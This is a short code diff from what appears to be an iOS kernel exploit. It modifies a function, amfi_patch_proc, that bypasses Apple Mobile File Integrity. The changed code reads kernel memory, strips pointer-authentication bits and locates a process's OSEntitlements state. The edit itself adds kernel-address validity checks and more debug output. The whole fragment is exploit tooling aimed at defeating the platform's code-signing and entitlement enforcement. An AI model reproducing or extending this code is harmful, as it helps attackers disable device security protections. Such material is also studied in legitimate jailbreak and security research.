@@ -97,18 +97,21 @@ bool amfi_patch_proc(uint64_t proc)
     }
 
     uint64_t amfi_obj = amfi_cslot_get(label);
-    if (!amfi_obj) {
-        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get AMFI slot\n");
+    if (!amfi_obj || !is_kaddr_valid(amfi_obj)) {
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get AMFI slot (amfi_obj=0x%llx)\n", amfi_obj);
         return false;
     }
+
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] OSEntitlements at 0x%llx\n", amfi_obj);
 
     // Read OSEntitlements to get the state pointer
     struct OSEntitlements ent;
     kreadbuf(amfi_obj, &ent, sizeof(ent));
 
     uint64_t state_kptr = xpaci((uint64_t)ent.state);
-    if (!is_valid_kptr(state_kptr)) {
-        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid state pointer: 0x%llx\n", state_kptr);
+    if (!is_kaddr_valid(state_kptr)) {
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid state pointer: 0x%llx (after xpaci from ent.state=0x%llx)\n",
+               state_kptr, (uint64_t)ent.state);
         return false;
     }
 
